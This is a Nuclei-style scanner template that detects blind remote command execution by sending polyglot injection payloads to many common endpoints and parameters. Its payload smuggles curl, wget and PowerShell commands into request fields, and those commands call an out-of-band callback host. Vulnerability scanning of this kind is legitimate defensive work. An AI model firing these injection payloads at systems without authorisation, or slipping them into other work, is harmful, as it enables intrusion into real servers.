http:
- method: GET
  path:
  - '{{BaseURL}}'
  - '{{BaseURL}}/'
  - '{{BaseURL}}/search'
  - '{{BaseURL}}/admin'
  - '{{BaseURL}}/debug'
  - '{{BaseURL}}/test'
  - '{{BaseURL}}/ping'
  - '{{BaseURL}}/exec'
  - '{{BaseURL}}/cmd'
  payloads:
    param:
    - cmd
    - command
    - exec
    - system
    - shell
    - run
    - execute
    - ping
    - test
    - debug
    - q
    - query
  raw:
  - 'GET {{path}}?{{param}}={{rce_polyglot_payload}} HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36

    Accept: */*

    Connection: close

    '
- body: '{{param}}={{rce_polyglot_payload}}'
  headers:
    Content-Type: application/x-www-form-urlencoded
  method: POST
  path:
  - '{{BaseURL}}/search'
  - '{{BaseURL}}/ping'
  - '{{BaseURL}}/cmd'
  - '{{BaseURL}}/exec'
  - '{{BaseURL}}/system'
  - '{{BaseURL}}/shell'
  - '{{BaseURL}}/run'
  payloads:
    param:
    - cmd
    - command
    - exec
    - system
    - ping
    - host
    - target
    - query
- body: "{\n  \"{{field}}\": \"{{rce_polyglot_payload}}\"\n}\n"
  headers:
    Accept: application/json
    Content-Type: application/json
  method: POST
  path:
  - '{{BaseURL}}/api/exec'
  - '{{BaseURL}}/api/cmd'
  - '{{BaseURL}}/api/system'
  - '{{BaseURL}}/api/shell'
  - '{{BaseURL}}/api/run'
  payloads:
    field:
    - command
    - cmd
    - exec
    - system
    - shell
    - run
- body: "{\n  \"command\": \"{{rce_polyglot_payload}}\",\n  \"shell\": \"/bin/bash\"\
    ,\n  \"timeout\": 30\n}\n"
  headers:
    Content-Type: application/json
  method: PUT
  path:
  - '{{BaseURL}}/config'
  - '{{BaseURL}}/settings'
  - '{{BaseURL}}/admin/config'
- body: "{\n  \"action\": \"execute\",\n  \"payload\": \"{{rce_polyglot_payload}}\"\
    \n}\n"
  headers:
    Content-Type: application/json
  method: PATCH
  path:
  - '{{BaseURL}}/system'
  - '{{BaseURL}}/admin/system'
- body: "{\n  \"webhook_url\": \"{{callback_url}}/webhook-{{exec_id}}\",\n  \"command\"\
    : \"{{rce_polyglot_payload}}\",\n  \"execute_on_callback\": true\n}\n"
  extractors:
  - internal: true
    kval:
    - interactsh_request
    part: interactsh_request
    type: kval
  - group: 1
    part: interactsh_request
    regex:
    - /stage1-(unix|powershell|cmd)-([a-z0-9]+)
    type: regex
  headers:
    Content-Type: application/json
  matchers:
  - condition: or
    part: interactsh_protocol
    type: word
    words:
    - http
    - dns
  - condition: or
    part: interactsh_request
    type: word
    words:
    - stage1-unix-
    - stage1-powershell-
    - stage1-cmd-
    - webhook-
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/webhook'
  - '{{BaseURL}}/callback'
id: blind-rce-polyglot-chain-oob
info:
  author: geeknik
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78,CWE-77
  description: 'Detects blind Remote Code Execution vulnerabilities using universal
    polyglot

    payloads that work across multiple shells (bash, zsh, PowerShell, cmd.exe).

    Features multi-stage callbacks confirming OS detection, command execution,

    and environment-aware payload adaptation with persistence detection.

    '
  name: Blind RCE Polyglot with Command Chaining OOB
  reference:
  - https://owasp.org/www-community/attacks/Command_Injection
  - https://portswigger.net/web-security/os-command-injection
  - https://book.hacktricks.xyz/pentesting-web/command-injection
  - https://attack.mitre.org/techniques/T1059/
  severity: critical
  tags: rce,command-injection,blind,polyglot,oob,shell,powershell,cmd
variables:
  callback_url: '{{interactsh-url}}'
  exec_id: '{{randstr}}'
  rce_polyglot_payload: '$(curl -s "{{callback_url}}/stage1-unix-{{exec_id}}" 2>/dev/null
    || wget -q -O- "{{callback_url}}/stage1-unix-{{exec_id}}" 2>/dev/null);powershell
    -Command "Invoke-WebRequest -Uri ''{{callback_url}}/stage1-powershell-{{exec_id}}''
    -UseBasicParsing" 2>$null & curl "{{callback_url}}/stage1-cmd-{{exec_id}}" 2>NUL

    '
